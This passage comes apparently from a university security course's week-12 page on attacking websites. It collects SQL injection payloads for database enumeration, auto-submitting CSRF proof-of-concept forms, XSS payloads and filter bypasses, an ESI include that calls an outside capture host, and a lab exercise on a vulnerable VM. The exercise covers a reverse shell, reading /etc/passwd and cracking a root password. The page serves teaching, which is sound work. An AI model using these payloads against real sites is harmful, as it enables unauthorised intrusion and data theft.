output of the query, you could make it print the version of the database . A continuation we are going to discuss different methods to exploit different kinds of SQL Injection. We will use MySQL as example. Exploiting Union Based Detecting number of columns If you can see the output of the query this is the best way to exploit it. First of all, wee need to find out the number of columns the initial request is returning. This is because both queries must return the same number of columns . Two methods are typically used for this purpose: Order/Group by Keep incrementing the number until you get a False response. Even though GROUP BY and ORDER BY have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query. 1' ORDER BY 1--+ #True 1' ORDER BY 2--+ #True 1' ORDER BY 3--+ #True 1' ORDER BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True 1' GROUP BY 1--+ #True 1' GROUP BY 2--+ #True 1' GROUP BY 3--+ #True 1' GROUP BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True UNION SELECT Select more and more null values until the query is correct: 1' UNION SELECT null-- - Not working 1' UNION SELECT null,null-- - Not working 1' UNION SELECT null,null,null-- - Worked You should use null values as in some cases the type of the columns of both sides of the query must be the same and null is valid in every case. Extract database names, table names and column names On the next examples we are going to retrieve the name of all the databases, the table name of a database, the column names of the table: #Database names -1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata #Tables of a database -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database] #Column names -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name] There is a different way to discover this data on every different database, but it's always the same methodology. Forms, WebSockets and PostMsgs When websocket, post message or a form allows user to perform actions vulnerabilities may arise. Cross Site Request Forgery Cross-site WebSocket hijacking (CSWSH) PostMessage Vulnerabilities CSRF (Cross Site Request Forgery) What is CSRF? Cross-site request forger y (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform . This is done by making a logged in user in the victim platform access an attacker controlled website and from there execute * malicious JS code, send forms or retrieve \"images\" to the* victims account . Requisites In order to be able to abuse a CSRF vulnerability you first need to find a relevant action to abuse (change password or email, make the victim follow you on a social network, give you more privileges...). The session must rely only on cookies or HTTP Basic Authentication header , any other header can't be used to handle the session. An finally, there shouldn't be unpredictable parameters on the request. Several counter-measures could be in place to avoid this vulnerability. Common defenses SameSite cookies : If the session cookie is using this flag, you may not be able to send the cookie from arbitrary web sites. Cross-origin resource sharing : Depending on which kind of HTTP request you need to perform to abuse the relevant action, you may take int account the CORS policy of the victim site . Note that the CORS policy won't affect if you just want to send a GET request or a POST request from a form and you don't need to read the response. Ask for the password user to authorise the action. Resolve a captcha Read the Referrer or Origin headers. If a regex is used it could be bypassed form example with: http://mal.net?orig=http://example.com (ends with the url) http://example.com.mal.net (starts with the url) Modify the name of the parameters of the Post or Get request Use a CSRF token in each session. This token has to be send inside the request to confirm the action. This token could be protected with CORS. CSRF map Exploit Examples Exfiltrating CSRF Token If a CSRF token is being used as defence you could try to exfiltrate it abusing a XSS vulnerability or a Dangling Markup vulnerability. GET using HTML tags <img src=\"http://google.es?param=VALUE\" style=\"display:none\" /> <h1>404 - Page not found</h1> The URL you are requesting is no longer available Other HTML5 tags that can be used to automatically send a GET request are: Form GET request <html> <!-- CSRF PoC - generated by Burp Suite Professional --> <body> <script>history.pushState('', '', '/')</script> <form method=\"GET\" action=\"https://victim.net/email/change-email\"> <input type=\"hidden\" name=\"email\" value=\"some@email.com\" /> <input type=\"submit\" value=\"Submit request\" /> </form> <script> document.forms[0].submit(); </script> </body> </html> Form POST request <html> <body> <script>history.pushState('', '', '/')</script> <form action=\"https://victim.net/email/change-email\" id=\"csrfform\"> <input type=\"hidden\" name=\"email\" value=\"some@email.com\" autofocus onfocus=\"csrfform.submit();\" /> <!-- Way 1 to autosubmit --> <input type=\"submit\" value=\"Submit request\" /> <img src=x onerror=\"csrfform.submit();\" /> <!-- Way 2 to autosubmit --> </form> <script> document.forms[0].submit(); //Way 3 to autosubmit </script> </body> </html> Form POST request through iframe <!-- The request is sent through the iframe withuot reloading the page --> <html> <body> <iframe style=\"display:none\" name=\"csrfframe\"></iframe> <form action=\"/change-email\" id=\"csrfform\" target=\"csrfframe\"> <input type=\"hidden\" name=\"email\" value=\"some@email.com\" autofocus onfocus=\"csrfform.submit();\" /> <input type=\"submit\" value=\"Submit request\" /> </form> <script> document.forms[0].submit(); </script> </body> </html> Tools https://github.com/0xInfection/XSRFProbe HTTP Headers Depending on the HTTP headers given by the web server some vulnerabilities might be present. Clickjacking Content Security Policy bypass Cookies Hacking CORS - Misconfigurations & Bypass Bypasses There are several specific functionalities were some workarounds might be useful to bypass them 2FA/OPT Bypass Bypass Payment Process Captcha Bypass Login Bypass Race Condition Rate Limit Bypass Reset Forgotten Password Bypass Registration Vulnerabilities Structured objects / Specific functionalities Some functionalities will require the data to be structured on a very specific format (like a language serialized object or a XML). Therefore, it's more easy to identify is the application might be vulnerable as it needs to be processing that kind of data. Some specific functionalities my be also vulnerable if a specific format of the input is used (like Email Header Injections). Deserialization Email Header Injection JWT Vulnerabilities XML External Entity Deserialization Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML. In many occasions you can find some code in the server side that unserialize some object given by the user. In this case, you can send a malicious payload to make the server side behave unexpectedly. You should read: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html for learn how to attack. PHP Magic method used with serialization: __sleep is called when an object is serialized and must be returned to array Magic method used with deserialization __wakeup is called when an object is deserialized. __destruct is called when PHP script end and object is destroyed. __toString uses object as string but also can be used to read file or more than that based on function call inside it. <?php class test { public $s = \"This is a test\"; public function displaystring(){ echo $this->s.'<br />'; } public function __toString() { echo '__toString method called'; } public function __construct(){ echo \"__construct method called\"; } public function __destruct(){ echo \"__destruct method called\"; } public function __wakeup(){ echo \"__wakeup method called\"; } public function __sleep(){ echo \"__sleep method called\"; return array(\"s\"); #The \"s\" makes references to the public attribute } } $o = new test(); $o->displaystring(); $ser=serialize($o); echo $ser; $unser=unserialize($ser); $unser->displaystring(); /* php > $o = new test(); __construct method called__destruct method called php > $o->displaystring(); This is a test<br /> php > $ser=serialize($o); __sleep method called php > echo $ser; O:4:\"test\":1:{s:1:\"s\";s:14:\"This is a test\";} php > $unser=unserialize($ser); __wakeup method called__destruct method called php > $unser->displaystring(); This is a test<br /> */ ?> If you look to the results you can see that the functions __wakeup and __destruct are called when the object is deserialized. Note that in several tutorials you will find that the __toString function is called when trying yo print some attribute, but apparently that's not happening anymore . Autoload Classes may also be dangerous . You can read an explained PHP example here : https://www.notsosecure.com/remote-code-execution-via-php-unserialize/, here https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf or here https://securitycafe.ro/2015/01/05/understanding-php-object-injection/ Serializing Referenced Values If for some reason you want to serialize a value as a reference to another value serialized you can: <?php class AClass { public $param1; public $param2; } $o = new WeirdGreeting; $o->param1 =& $o->param22; $o->param = \"PARAM\"; $ser=serialize($o); Files Functionalities that allow to upload files might be vulnerable to several issues. Functionalities that generates files including user input might execute unexpected code. Users that open files uploaded by users or automatically generated including user input might be compromised. File Upload Formula Injection PDF Injection Server Side XSS External Identity Management OAUTH to Account takeover SAML Attacks Other Helpful Vulnerabilities This vulnerabilities might help to exploit other vulnerabilities. Domain/Subdomain takeover IDOR Parameter Pollution Unicode Normalization vulnerability Exercise (10 pt) Blogger Website In this challenge, you need to download the following virtual machine to finish the challenges. The box was created with Virtualbox . Upon booting up use netdiscover tool to find the IP address. This is the target address based on whatever settings you have. You should verify the address just in case. You don't need to answer all questions in order. Skip some questions may not affect the next steps. Download: https://mega.nz/file/HxFXgIAT#PFjk8HV_ltXVh-Hz1D3xAXYc31GpmgTQeFfkKibn9Tc Mirror: https://pan.baidu.com/s/1mOZxE_XHgbSZR_yKTWQAbA (Code: 1337) (2 pt) Establish Environment setup should use VirtualBox history version (VirtualBox 6.1.28 has a bug with Hyper-V, I used VirtualBox 6.0.24 and worked properly). You should setup Network as the following: While the Serial Ports setting as follow (Port Mode set to Disconnected ): The virtual image should enter the following promption: Ubuntu 16.04.7 LTS ubuntu-xenial tty1 ubuntu-xenial login: _ Finding the IP address: Open you terminal (powershell.exe in Windows), and use ipconfig /all to find your Host-only NET ip address. Use any tool to scan the ip 192.168.xx.0/24 and you can find the virtual machine ip address. Otherwise, you can also use arp -a to find your Host-only Network address, and usually VM's ip address is followed. Open your web browser, you can find this page in VM's ip address: You are done with configuration, now you can hack the machine and solve the challenges! Upload a screenshot about the web page and the IP address would give 2 points. (2 pt) Port scan and directory scan Using Nmap you can scan open ports of VM. Only port 80 is open and we can find a HTTP website. Using Gobuster or Dirb to scan the website directory, you may find a upload folder under the blogger. What's the URL of the upload folder? Answer: http://ip/******/*****/****/**********/*******/ (replace all stars to your answer) Hint: kali wordlists for scanning: /usr/share/wordlists. If you don't have those files, it's fine to search a wordlist online. (2 pt) Wordpress It's easy to find the blogger is using Wordpress. The version of the given blogger is vulnerable. What's the vulnerability name of the blogger? Answer: A******** F*** U***** (replace all stars to your answer, needn't to be 100% the same) Hint: look at the version of wordpress. Search in the exploitDB. (2 pt) Reverse shell Using the vulnerability, you can get a reversed shell. Besides, with some techniques, you can generate a pty shell. What's the name of users? Answer: u*****, j****, v****** (replace all stars to your answer) Hint: users can be located in /etc/passwd or /home folder. (2 pt) Root Weak password is dangerous, using Hydra or other password cracker can easily break the weak password. Get the root privilege and find me root.txt . Answer: flag{****_****_***_**********_** **} Hint: sometimes sudo can be vulnerable.","title":"Week12 WEB: Attacking Websites"},{"location":"CS315/Week%2012/#week12-web-attacking-websites","text":"In every pentest web there is several hidden and obvious places that might be vulnerable. This post is meant to be a checklist to confirm that you have searched vulnerabilities in all the possible places.","title":"Week12 WEB: Attacking Websites"},{"location":"CS315/Week%2012/#top-10-vulnerabilities","text":"https://owasp.org/www-project-top-ten/ Injection Broken Authentication and Session Management Sensitive Data Exposure XML External Entity Broken Access Control Security Misconfiguration Cross-Site Scripting Insecure deserialization Using Components With Known Vulnerabilities Insufficient Logging and Monitoring","title":"Top 10 vulnerabilities"},{"location":"CS315/Week%2012/#proxies","text":"Nowadays web applications usually uses some kind of intermediary proxies, those may be (ab)used to exploit vulnerabilities. These vulnerabilities need a vulnerable proxy to be in place, but they usually also need some extra vulnerability in the backend. Abusing hop-by-hop headers Cache Poisoning/Cache Deception HTTP Request Smuggling H2C Smuggling Server Side Inclusion/Edge Side Inclusion Uncovering Cloudflare XSLT Server Side Injection","title":"Proxies"},{"location":"CS315/Week%2012/#user-input","text":"Most of the web applications will allow users to input some data that will be processed later. Depending on the structure of the data the server is expecting some vulnerabilities may or may not apply.","title":"User input"},{"location":"CS315/Week%2012/#reflected-values","text":"If the introduced data may somehow being reflected in the response, the page might be vulnerable to several issues. Client Side Template Injection Command Injection CRLF Dangling Markup File Inclusion/Path Traversal Open Redirect Prototype Pollution to XSS Server Side Inclusion/Edge Side Inclusion Server Side Request Forgery Server Side Template Injection Reverse Tab Nabbing XSLT Server Side Injection XSS XSSI XS-Search Some of the mentioned vulnerabilities requires special conditions, others just require the content to be reflected. You can find some interesting polygloths to test quickly the vulnerabilities in: Reflecting Techniques - PoCs and Polygloths CheatSheet","title":"Reflected Values"},{"location":"CS315/Week%2012/#xss-cross-site-scripting","text":"","title":"XSS (Cross Site Scripting)"},{"location":"CS315/Week%2012/#methodology","text":"Check if any value you control ( parameters , path , headers ?, cookies ?) is being reflected in the HTML or used by JS code. Find the context where it's reflected/used. If reflected Check which symbols can you use and depending on that, prepare the payload: In raw HTML : Can you create new HTML tags? Can you use events or attributes supporting javascript: protocol? Can you bypass protections? Is the HTML content being interpreted by any client side JS engine ( AngularJS , VueJS , Mavo ...), you could abuse a Client Side Template Injection . If you cannot create HTML tags that execute JS code, could you abuse a Dangling Markup - HTML scriptless injection ? Inside a HTML tag : Can you exit to raw HTML context? Can you create new events/attributes to execute JS code? Does the attribute where you are trapped support JS execution? Can you bypass protections? Inside JavaScript code : Can you escape the <script> tag? Can you escape the string and execute different JS code? Are your input in template literals ``? Can you bypass protections? If used : You could exploit a DOM XSS , pay attention how your input is controlled and if your controlled input is used by any sink.","title":"Methodology"},{"location":"CS315/Week%2012/#reflected-values_1","text":"In order to successfully exploit a XSS the first thing you need to find is a value controlled by you that is being reflected in the web page. Intermediately reflected : If you find that the value of a parameter or even the path is being reflected in the web page you could exploit a Reflected XSS . Stored and reflected : If you find that a value controlled by you is saved in the server and is reflected every time you access a page you could exploit a Stored XSS . Accessed via JS : If you find that a value controlled by you is being access using JS you could exploit a DOM XSS .","title":"Reflected values"},{"location":"CS315/Week%2012/#contexts","text":"When trying to exploit a XSS the first thing you need to know if where is your input being reflected . Depending on the context, you will be able to execute arbitrary JS code on different ways.","title":"Contexts"},{"location":"CS315/Week%2012/#raw-html","text":"If your input is reflected on the raw HTML page you will need to abuse some HTML tag in order to execute JS code: <img , <iframe , <svg , <script ... these are just some of the many possible HTML tags you could use. Also, keep in mind Client Side Template Injection .","title":"Raw HTML"},{"location":"CS315/Week%2012/#inside-html-tags-attribute","text":"If your input is reflected inside the value of the attribute of a tag you could try: To escape from the attribute and from the tag (then you will be in the raw HTML) and create new HTML tag to abuse: \"><img [...] If you can escape from the attribute but not from the tag ( > is encoded or deleted), depending on the tag you could create an event that executes JS code: \" autofocus onfocus=alert(1) x=\" If you cannot escape from the attribute ( \" is being encoded or deleted), then depending on which attribute your value is being reflected in if you control all the value or just a part you will be able to abuse it. For example , if you control an event like onclick= you will be able to make it execute arbitrary code when it's clicked. Another interesting example is the attribute href , where you can use the javascript: protocol to execute arbitrary code: href=\"javascript:alert(1)\" If your input is reflected inside \" unexpoitable tags \" you could try the accesskey trick to abuse the vuln (you will need some kind of social engineer to exploit this): \" accesskey=\"x\" onclick=\"alert(1)\" x=\"","title":"Inside HTML tags attribute"},{"location":"CS315/Week%2012/#inside-javascript-code","text":"In this case your input is reflected between <script> [...] </script> tags of a HTML page, inside a .js file or inside an attribute using javascript: protocol: If reflected between <script> [...] </script> tags, even if your input if inside any kind of quotes, you can try to inject </script> and escape from this context. This works because the browser will first parse the HTML tags and then the content, therefore, it won't notice that your injected </script> tag is inside the HTML code. If reflected inside a JS string and the last trick isn't working you would need to exit the string, execute your code and reconstruct the JS code (if there is any error, it won't be executed: '-alert(1)-' ';-alert(1)// \\';alert(1)// If reflected inside template literals you can **embed JS expressions** using `${ ... }` syntax: var greetings =`Hello, ${alert(1)}```","title":"Inside JavaScript code"},{"location":"CS315/Week%2012/#dom","text":"There is JS code that is using unsafely some data controlled by an attacker like location.href . An attacker, could abuse this to execute arbitrary JS code. https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/dom-xss.md","title":"DOM"},{"location":"CS315/Week%2012/#universal-xss","text":"These kind of XSS can be found anywhere . They not depend just on the client exploitation of a web application but on any context . These kind of arbitrary JavaScript execution can even be abuse to obtain RCE , read arbitrary files in clients and servers, and more. Some examples : https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.md https://github.com/carlospolop/hacktricks/blob/master/pentesting/pentesting-web/xss-to-rce-electron-desktop-apps.md","title":"Universal XSS"},{"location":"CS315/Week%2012/#injecting-inside-raw-html","text":"When your input is reflected inside the HTML page or you can escape and inject HTML code in this context the first thing you need to do if check if you can abuse < to create new tags: Just try to reflect that char and check if it's being HTML encoded or deleted of if it is reflected without changes . Only in the last case you will be able to exploit this case . For this cases also keep in mind Client Side Template Injection . Note: A HTML comment can be closed using --> or --!> In this case and if no black/whitelisting is used, you could use payloads like: <script>alert(1)</script> <img src=x onerror=alert(1) /> <svg onload=alert('XSS')> But, if tags/attributes black/whitelisting is being used, you will need to brute-force which tags you can create. Once you have located which tags are allowed , you would need to brute-force attributes/events inside the found valid tags to see how you can attack the context.","title":"Injecting inside raw HTML"},{"location":"CS315/Week%2012/#tagsevents-brute-force","text":"Go to https://portswigger.net/web-security/cross-site-scripting/cheat-sheet and click on Copy tags to clipboard . Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can brute force all the events using the valid tags (in the same web page click on Copy events to clipboard and follow the same procedure as before).","title":"Tags/Events brute-force"},{"location":"CS315/Week%2012/#custom-tags","text":"If you didn't find any valid HTML tag, you could try to create a custom tag and and execute JS code with the onfocus attribute. In the XSS request, you need to end the URL with # to make the page focus on that object and execute the code: /?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x","title":"Custom tags"},{"location":"CS315/Week%2012/#blacklist-bypasses","text":"If some kind of blacklist is being used you could try to bypass it with some silly tricks: //Random capitalization <script> --> <ScrIpT> <img --> <ImG //Double tag, in case just the first match is removed <script><script> <scr<script>ipt> <SCRscriptIPT>alert(1)</SCRscriptIPT> //You can substitude the space to separate attributes for: / /*%00/ /%00*/ %2F %0D %0C %0A %09 //Unexpected parent tags <svg><x><script>alert('1'&#41</x> //Unexpected weird attributes <script x> <script a=\"1234\"> <script ~~~> <script/random>alert(1)</script> <script ///Note the newline >alert(1)</script> <scr\\x00ipt>alert(1)</scr\\x00ipt> //Not closing tag, ending with \" <\" or \" //\" <iframe SRC=\"javascript:alert('XSS');\" < <iframe SRC=\"javascript:alert('XSS');\" // //Extra open <<script>alert(\"XSS\");//<</script> //Just weird an unexpected, use your imagination <</script/script><script> <input type=image src onerror=\"prompt(1)\"> //Using `` instead of parenthesis onerror=alert`1` //Use more than one <<TexTArEa/*%00//%00*/a=\"not\"/*%00///AutOFocUs////onFoCUS=alert`1` //","title":"Blacklist Bypasses"},{"location":"CS315/Week%2012/#length-bypass-xss-in-20chars","text":"Taken from the blog of Jorge Lajara . <svg/onload=alert``> <script src=//aa.es> <script src=//\u2121\u33db.pw> The last one is using 2 unicode characters which expands to 5: telsr More of these characters can be found here . To check in which characters are decomposed check here . More tiny XSS for different environments payload [can be found here and here .","title":"Length bypass (XSS in 20chars)"},{"location":"CS315/Week%2012/#click-xss-clickjacking","text":"If in order to exploit the vulnerability you need the user to click a link or a form with prepopulated data you could try to abuse Clickjacking (if the page is vulnerable).","title":"Click XSS - Clickjacking"},{"location":"CS315/Week%2012/#impossible-dangling-markup","text":"If you just think that it's impossible to create an HTML tag with an attribute to execute JS code , you should check Danglig Markup because you could exploit the vulnerability without executing JS code.","title":"Impossible - Dangling Markup"},{"location":"CS315/Week%2012/#xss-abusing-other-vulnerabilities","text":"","title":"XSS Abusing other vulnerabilities"},{"location":"CS315/Week%2012/#xss-to-ssrf","text":"Got XSS on a site that uses caching ? Try upgrading that to SSRF through Edge Side Include Injection with this payload: <esi:include src=\"http://yoursite.com/capture\" /> Use it to bypass cookie restrictions, XSS filters and much more! More information about this technique here: XSLT .","title":"XSS to SSRF"},{"location":"CS315/Week%2012/#xss-in-dynamic-created-pdf","text":"If a web page is creating a PDF using user controlled input, you can try to trick the bot that is creating the PDF into executing arbitrary JS code . So, if the PDF creator bot finds some kind of HTML tags , it is going to interpret them, and you can abuse this behaviour to cause a Server XSS . https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.md If you cannot inject HTML tags it could be worth it to try to inject PDF data : https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/pdf-injection.md","title":"XSS in dynamic created PDF"},{"location":"CS315/Week%2012/#xss-uploading-files-svg","text":"Upload as an image a file like the following one (from http://ghostlulz.com/xss-svg/): Content-Type: multipart/form-data; boundary=---------------------------232181429808 Content-Length: 574 -----------------------------232181429808 Content-Disposition: form-data; name=\"img\"; filename=\"img.svg\" Content-Type: image/svg+xml <?xml version=\"1.0\" standalone=\"no\"?> <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"> <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> <rect width=\"300\" height=\"100\" style=\"fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)\" /> <script type=\"text/javascript\"> alert(1); </script> </svg> -----------------------------232181429808-- <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> <script type=\"text/javascript\">alert(\"XSS\")</script> </svg> <?xml version=\"1.0\" standalone=\"no\"?> <!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"> <svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"> <polygon id=\"triangle\" points=\"0,0 0,50 50,0\" fill=\"#009900\" stroke=\"#004400\"/> <script type=\"text/javascript\"> alert(\"XSS\"); </script> </svg>","title":"XSS uploading files (svg)"},{"location":"CS315/Week%2012/#xss-resources","text":"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection http://www.xss-payloads.com https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt https://github.com/materaj/xss-list https://github.com/ismailtasdelen/xss-payload-list https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec https://netsec.expert/2020/02/01/xss-in-2020.html","title":"XSS resources"},{"location":"CS315/Week%2012/#xss-tools","text":"Find some tools for XSS here .","title":"XSS TOOLS"},{"location":"CS315/Week%2012/#search-functionalities","text":"If the functionality may be used to search some kind of data inside the backend, maybe you can (ab)use it to search arbitrary data. File Inclusion/Path Traversal NoSQL Injection LDAP Injection ReDoS SQL Injection XAPTH Injection","title":"Search functionalities"},{"location":"CS315/Week%2012/#sql-injection","text":"","title":"SQL Injection"},{"location":"CS315/Week%2012/#what-is-sql-injection","text":"SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database . It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users , or any other data that the application itself is able to access . In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behaviour. In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack. (From here ). In this POST I'm going to suppose that we have found a possible SQL injection and we are going to discuss possible methods to confirm the SQL injection, recon the database and perform actions.","title":"What is SQL injection?"},{"location":"CS315/Week%2012/#entry-point-detection","text":"You may have found a site that is apparently vulnerable to SQL i just because the server is behaving weird with SQLi related inputs. Therefore, the first thing you need to do is how to inject data in the query without breaking it. To do so you first need to find how to escape from the current context. These are some useful examples: [Nothing] ' \" ` ') \") `) ')) \")) `)) Then, you need to know how to fix the query so there isn't errors . In order to fix the query you can input data so the previous query accept the new data , or you can just input your data and add a comment symbol add the end . Note that if you can see error messages or you can spot differences when a query is working and when it's not this phase will be more easy.","title":"Entry point detection"},{"location":"CS315/Week%2012/#comments","text":"MySQL #comment -- comment [Note the space after the double dash] /*comment*/ /*! MYSQL Special SQL */ PostgreSQL --comment /*comment*/ MSQL --comment /*comment*/ Oracle --comment SQLite --comment /*comment*/ HQL HQL does not support comments","title":"Comments"},{"location":"CS315/Week%2012/#confirming-with-logical-operations","text":"One of the best ways to confirm a SQL injection is by making it operate a logical operation and having the expected results. For example: if the GET parameter ?username=Peter returns the same content as ?username=Peter' or '1'='1 then, you found a SQL injection. Also you can apply this concept to mathematical operations . Example: If ?id=1 returns the same as ?id=2-1 , SQLinjection. page.asp?id=1 or 1=1 -- true page.asp?id=1' or 1=1 -- true page.asp?id=1\" or 1=1 -- true page.asp?id=1 and 1=2 -- false","title":"Confirming with logical operations"},{"location":"CS315/Week%2012/#confirming-with-timing","text":"In some cases you won't notice any change on the page you are testing. Therefore, a good way to discover blind SQL injections is making the DB perform actions and will have an impact on the time the page need to load. Therefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete: MySQL (string concat and logical ops) 1' + sleep(10) 1' and sleep(10) 1' && sleep(10) 1' | sleep(10) PostgreSQL (only support string concat) 1' || pg_sleep(10) MSQL 1' WAITFOR DELAY '0:0:10' Oracle 1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10) SQLite 1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) 1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) In some cases the sleep functions won't be allowed . Then, instead of using those functions you could make the query perform complex operations that will take several seconds. Examples of these techniques are going to be commented separately on each technology (if any) .","title":"Confirming with Timing"},{"location":"CS315/Week%2012/#identifying-back-end","text":"The best way to identify the back-end is trying to execute functions of the different back-ends. You could use the sleep functions of the previous section or these ones: [\"conv('a',16,2)=conv('a',16,2)\" ,\"MYSQL\"], [\"connection_id()=connection_id()\" ,\"MYSQL\"], [\"crc32('MySQL')=crc32('MySQL')\" ,\"MYSQL\"], [\"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\" ,\"MSSQL\"], [\"@@CONNECTIONS>0\" ,\"MSSQL\"], [\"@@CONNECTIONS=@@CONNECTIONS\" ,\"MSSQL\"], [\"@@CPU_BUSY=@@CPU_BUSY\" ,\"MSSQL\"], [\"USER_ID(1)=USER_ID(1)\" ,\"MSSQL\"], [\"ROWNUM=ROWNUM\" ,\"ORACLE\"], [\"RAWTOHEX('AB')=RAWTOHEX('AB')\" ,\"ORACLE\"], [\"LNNVL(0=123)\" ,\"ORACLE\"], [\"5::int=5\" ,\"POSTGRESQL\"], [\"5::integer=5\" ,\"POSTGRESQL\"], [\"pg_client_encoding()=pg_client_encoding()\" ,\"POSTGRESQL\"], [\"get_current_ts_config()=get_current_ts_config()\" ,\"POSTGRESQL\"], [\"quote_literal(42.5)=quote_literal(42.5)\" ,\"POSTGRESQL\"], [\"current_database()=current_database()\" ,\"POSTGRESQL\"], [\"sqlite_version()=sqlite_version()\" ,\"SQLITE\"], [\"last_insert_rowid()>1\" ,\"SQLITE\"], [\"last_insert_rowid()=last_insert_rowid()\" ,\"SQLITE\"], [\"val(cvar(1))=1\" ,\"MSACCESS\"], [\"IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0\" ,\"MSACCESS\"], [\"cdbl(1)=cdbl(1)\" ,\"MSACCESS\"], [\"1337=1337\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"], [\"'i'='i'\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"], Also, if you have access to the output of the query, you could make it print the version of the database . A continuation we are going to discuss different methods to exploit different kinds of SQL Injection. We will use MySQL as example.","title":"Identifying Back-end"},{"location":"CS315/Week%2012/#exploiting-union-based","text":"","title":"Exploiting Union Based"},{"location":"CS315/Week%2012/#detecting-number-of-columns","text":"If you can see the output of the query this is the best way to exploit it. First of all, wee need to find out the number of columns the initial request is returning. This is because both queries must return the same number of columns . Two methods are typically used for this purpose:","title":"Detecting number of columns"},{"location":"CS315/Week%2012/#ordergroup-by","text":"Keep incrementing the number until you get a False response. Even though GROUP BY and ORDER BY have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query. 1' ORDER BY 1--+ #True 1' ORDER BY 2--+ #True 1' ORDER BY 3--+ #True 1' ORDER BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True 1' GROUP BY 1--+ #True 1' GROUP BY 2--+ #True 1' GROUP BY 3--+ #True 1' GROUP BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True","title":"Order/Group by"},{"location":"CS315/Week%2012/#union-select","text":"Select more and more null values until the query is correct: 1' UNION SELECT null-- - Not working 1' UNION SELECT null,null-- - Not working 1' UNION SELECT null,null,null-- - Worked You should use null values as in some cases the type of the columns of both sides of the query must be the same and null is valid in every case.","title":"UNION SELECT"},{"location":"CS315/Week%2012/#extract-database-names-table-names-and-column-names","text":"On the next examples we are going to retrieve the name of all the databases, the table name of a database, the column names of the table: #Database names -1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata #Tables of a database -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database] #Column names -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name] There is a different way to discover this data on every different database, but it's always the same methodology.","title":"Extract database names, table names and column names"},{"location":"CS315/Week%2012/#forms-websockets-and-postmsgs","text":"When websocket, post message or a form allows user to perform actions vulnerabilities may arise. Cross Site Request Forgery Cross-site WebSocket hijacking (CSWSH) PostMessage Vulnerabilities","title":"Forms, WebSockets and PostMsgs"},{"location":"CS315/Week%2012/#csrf-cross-site-request-forgery","text":"","title":"CSRF (Cross Site Request Forgery)"},{"location":"CS315/Week%2012/#what-is-csrf","text":"Cross-site request forger y (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform . This is done by making a logged in user in the victim platform access an attacker controlled website and from there execute * malicious JS code, send forms or retrieve \"images\" to the* victims account .","title":"What is CSRF?"},{"location":"CS315/Week%2012/#requisites","text":"In order to be able to abuse a CSRF vulnerability you first need to find a relevant action to abuse (change password or email, make the victim follow you on a social network, give you more privileges...). The session must rely only on cookies or HTTP Basic Authentication header , any other header can't be used to handle the session. An finally, there shouldn't be unpredictable parameters on the request. Several counter-measures could be in place to avoid this vulnerability.","title":"Requisites"},{"location":"CS315/Week%2012/#common-defenses","text":"SameSite cookies : If the session cookie is using this flag, you may not be able to send the cookie from arbitrary web 